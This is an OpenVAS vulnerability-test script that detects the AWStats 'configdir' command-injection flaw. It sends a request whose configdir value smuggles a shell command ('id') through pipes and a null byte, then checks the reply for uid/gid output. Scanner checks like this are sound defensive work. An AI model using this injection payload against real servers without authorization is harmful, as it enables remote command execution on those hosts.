# OpenVAS Vulnerability Test
# $Id: awstats_configdir.nasl 6056 2017-05-02 09:02:50Z teissa $
# Description: AWStats configdir parameter arbitrary cmd exec
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
#
# Copyright:
# Copyright (C) 2005 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

# Ref: iDEFENSE 
# changes by rd: changed the web reqeuest
 
if(description)
{
 script_id(16189);
 script_version("$Revision: 6056 $");
 script_tag(name:"last_modification", value:"$Date: 2017-05-02 11:02:50 +0200 (Tue, 02 May 2017) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(12270, 12298);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_name("AWStats configdir parameter arbitrary cmd exec");

 
 script_category(ACT_GATHER_INFO);
  script_tag(name:"qod_type", value:"remote_vul");
 
 script_copyright("This script is Copyright (C) 2005 David Maciejak");
 script_family("Web application abuses");
 
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_tag(name:"solution", value:"Upgrade at least to version 6.3 of this software");
 script_tag(name:"summary", value:"The remote host is running AWStats, a free real-time logfile analyzer.

The remote version of this software is prone to an input validation 
vulnerability. 

The issue is reported to exist because user supplied 'configdir' URI data passed
to the 'awstats.pl' script is not sanitized.

An attacker may exploit this condition to execute commands remotely or disclose 
contents of web server readable files.");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");


http_check_remote_code (
			extra_dirs:make_list("/awstats"),
			extra_check:"Check config file, permissions and AWStats documentation",
			check_request:"/awstats.pl?configdir=|echo%20Content-Type:%20text/html;%20echo%20;id|%00",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id"
			);
